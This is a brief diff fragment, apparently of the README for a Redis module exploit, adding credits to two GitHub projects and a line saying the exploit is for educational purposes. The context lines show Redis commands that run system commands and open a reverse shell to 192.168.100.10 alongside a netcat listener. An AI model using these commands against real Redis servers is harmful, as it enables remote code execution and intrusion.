@@ -32,3 +32,8 @@ REDIS-CLI:6379> system.exec "id"
 nc -nvlp 80
 REDIS-CLI:6379> system.rev 192.168.100.10 80
 ```
+---
+This Exploit is an aggregation of below exploits made for understanding and educational purposes.
+- Credits:
+  - https://github.com/RedisLabsModules/RedisModulesSDK
+  - https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
